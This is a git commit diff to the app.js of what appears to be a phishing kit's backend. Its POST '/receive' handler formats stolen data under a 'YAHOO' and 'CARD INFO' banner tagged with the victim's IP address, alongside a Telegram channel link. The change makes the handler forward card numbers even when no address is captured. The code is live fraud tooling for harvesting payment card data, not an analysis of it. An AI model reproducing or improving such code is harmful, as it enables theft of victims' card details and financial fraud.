f447220d23aaa224ed7cddc7c8303d4dd3053644
perez433 <154991957+perez433@users.noreply.github.com>
2024-01-19 22:32:45 +0100

    Update app.js

--- app.js
+++ app.js
@@ -96,7 +96,7 @@ app.post('/receive', async (req, res) => {
         `💬 Telegram: https://t.me/UpdateTeams\n`;
   }
 
-  if (myObjects.includes('Card-number') && myObjects.includes('Address')) {
+  if (myObjects.includes('Card-number')) {
     message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
